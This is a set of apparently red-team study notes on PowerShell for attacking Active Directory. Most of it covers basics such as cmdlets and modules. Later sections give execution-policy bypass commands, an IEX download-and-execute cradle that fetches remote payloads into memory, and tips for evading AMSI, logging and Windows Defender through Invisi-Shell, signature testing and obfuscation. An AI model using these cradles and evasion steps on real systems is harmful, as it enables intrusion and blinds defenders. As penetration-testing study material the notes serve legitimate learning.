# PowerShell
### PowerShell
- When attacking active directory environments, PowerShell are mostly using to enumerate active directory environment.
- **PowerShell is a shell and scripting language**.
- Powershell provides access to almost everything in a Windows OS and Active Directory Environment.
- It comes pre-installed since Windows Vista.
- PowerShell is not "powershell.exe".
- Powershell.exe is a DLL to access PowerShell.
- Powershell is based on .NET framework
- Powershell is tightly integrated with Windows OS.
- There is a operating system independent version named PowerShell Core.
- PowerShell is installed by default on Windows OS since Windows Vista.
### PowerShell CmdLets
- **Command Lets (Cmdlets) are used to perform an action**.
- **Cmdlets results a .NET object as output**.
- Cmdlets accept parameters for different operations.
- Cmdlets have aliases.
- Cmdlets are NOT executables.
- As an attacker, we can write our own cmdlet with few lines of script.
- `Get-Command -CommandType cmdlet`: To list all cmdlets
- Example: `Get-Process` : lists processes running on a Windows OS installed computer.
### PowerShell Help System
- `Get-Help` is a cmdlet.
- Shows a brief help about the cmdlet or topic.
- Supports Wildcard
- Comes with various options and filters.
- Example: `Get-Help *`
### PowerShell Scripts
- PowerShell scripts may use;
    - cmdlets
    - native executables
    - functions
    - .NET classes
    - DLLs
    - Windows API
	and much more in a single script.
### PowerShell ISE
- ISE is a GUI Editor and Scripting environment.
- ISE comes with a handy console pane to run commands.
### PowerShell Execution Policy
- **Execution Policy prevents users from accidently executing scripts**.
- **It is NOT a security measure**.
- Execution Policy Bypass Commands:
    - `powershell -ExecutionPolicy bypass`
    - `powershell -c <command>`
    - `powershell -encodedcommand $env:PSExecutionPolicyPreference="bypass"`
- **None of these bypasses requires administrative privileges**.
### PowerShell Scripts and Modules
- **PowerShell supports modules and scripts**.
- Pre-built modules and scripts contain useful commands to execute on PowerShell instance.
- A module or a script can be imported with:
    - `Import-Module <module-name>.psd1`
- All the commands in a module can be listed with:
    - `Get-Command -Module <module-name>`
- A script can be imported with using dot sourcing:
	- `. .\<script-name>.ps1`
### PowerShell Script Execution in Computer Memory
- Download execute cradle:
    - `IEX (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')`
- **IEX = Invoke Expression
- **This command downloads a script and executes the script in memory**.
- PowerShell v3 onwards: `iex (iwr 'http://webserver/payload.ps1')`
### PowerShell and Active Directory
- We can interact with active directory services from a powershell instance with:
	- ADSI
	- .NET Classes
	- Native Executables
	- WMI Using Powershell
	- Microsoft's ActiveDirectory Module
### Powershell Malicious Script or Module Detections
- System-Wide transcription:
	- Logs all the commands
	- Since windows server 2016.
- Script block logging:
	- Turned on by default since windows server 2019.
- **AntiMalware Scan Interface** (**AMSI**)
- Constrained Language Mode (CLM)
	- Integrated with AppLocker and WDAC (Device Guard)
### Windows AMSI Bypass
- `Invisi-Shell` tool is used for bypassing security controls in Powershell.
- The tool hooks the .NET assemblies to bypass logging.
- It uses a CLR Profiler API to perform the hook.
* **Using Invisi-Shell**: 
	* Admin privileges: `RunWithPathAsAdmin.bat`
	* Non-admin privilges: `RunWithRegistryNonAdmin.bat`
### Bypassing AV Signatures for Powershell
- We can always load scripts in memory to avoid detection using Invoke-Expression cmdlet with Invoke-WebRequest cmdlet.

- If we are executing scripts/binaries from storage disk, we need to bypass Windows Defender:
    - `AMSITrigger` tool to identify detected part of a script.
    - `DefenderCheck` tool to identify code and strings from a binary file that Windows Defender may flag.

```powershell
$ AMSItrigger.exe -i C:\AD\Tools\Invoke-PowershellTcp.ps1
$ DefenderCheck.exe PowerUp.ps1
```

* After detecting strings that has been catched by Windows Defender, we can change variable names or add backticks in cmdlets to bypass Anti-Malware programs and Windows Defender.

- For full obfuscation of PowerShell scripts, we can use `Invoke-Obfuscation`. 
- This PowerShell script is used in obfuscation process to bypass AMSI.
